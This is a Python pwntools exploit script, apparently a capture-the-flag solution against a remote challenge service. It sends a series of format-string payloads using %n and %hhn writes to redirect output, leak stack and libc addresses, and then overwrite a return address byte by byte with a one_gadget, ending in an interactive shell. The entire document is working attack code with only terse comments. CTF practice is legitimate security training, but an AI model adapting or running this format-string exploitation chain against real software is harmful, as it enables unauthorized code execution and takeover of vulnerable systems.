from pwn import *

r = remote("csie.ctf.tw",10132)

def fmt(p):
    r.sendline(p)
    sleep(0.5)

def get(i, n, byte = 2):
    return (i>>8*byte*(n-1))& int("ff"*byte,16)

# redirect to stdout
position = 0x601010
value = 1

fmt("%{}c%7$n".format(position))
fmt("%{}c%9$hhn".format(value))

# leak stack, libc
# %6$p: ret
fmt("%5$p.%10$p.") 

# stack
# %5$p : rbp
# ret = %5$p - 0x10 + 0x8

r.recvuntil("0x")
stack = int(r.recvuntil('.', drop=True),16)
print('stack = %s'%hex(stack))

# libc 0x021ab0 + 231
libc_offset = 0x021ab0 + 231 
r.recvuntil("0x")
libc = int(r.recvuntil('.', drop=True),16) - libc_offset
print('libc = %s'%hex(libc))


# one_gadget
# gadget0 = libc + 0x4f2c5
gadget1 = libc + 0x4f322
gadget2 = libc + 0x10a38c
print(hex(gadget1))

# RBP chain
# 1. write stack
# position: rsp + 0x40 = (stack + 0x10) + 0x40
# value: NULL
position = stack + 0x10 + 0x40
value = 0
p = position & 0xff


fmt("%{}c%5$hhn".format(p-1))
fmt("%{}c%7$n".format(0))

# 2. one gadget
# position: ret1 = stack + 0x8
# value: gadget
position = stack + 0x8
value = gadget1
p=position & 0xff

fmt("%{}c%5$hhn".format(p))
fmt("%{}c%7$hhn".format(get(value,1,1)))
fmt("%{}c%5$hhn".format(p+1))
fmt("%{}c%7$n".format(get(value,2,1)))
fmt("%{}c%5$hhn".format(p+2))
fmt("%{}c%7$hhn".format(get(value,3,1)))
fmt("%{}c%5$hhn".format(p+3))
fmt("%{}c%7$hhn".format(get(value,4,1)))
fmt("%{}c%5$hhn".format(p+4))
fmt("%{}c%7$hhn".format(get(value,5,1)))
fmt("%{}c%5$hhn".format(p+5))
fmt("%{}c%7$hhn".format(get(value,6,1)))

r.interactive()
